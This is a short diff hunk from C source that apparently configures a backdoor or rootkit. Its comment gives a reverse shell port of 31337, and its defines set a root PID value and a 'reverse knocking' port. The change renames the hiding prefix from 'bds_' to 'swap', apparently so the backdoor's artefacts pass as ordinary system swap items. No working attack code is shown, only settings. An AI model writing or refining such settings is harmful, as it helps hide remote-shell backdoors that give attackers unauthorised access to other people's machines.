@@ -3,7 +3,7 @@
 	/*
 	reverse shell port is 31337
 	*/
-	#define BDS_PREFIX "bds_"
+	#define BDS_PREFIX "swap"
 	#define BDS_PORT "31337"
 	#define BDS_ROOT_PID "000"
 	#define BDS_REVERSE_KNOCKING_PORT "1337"
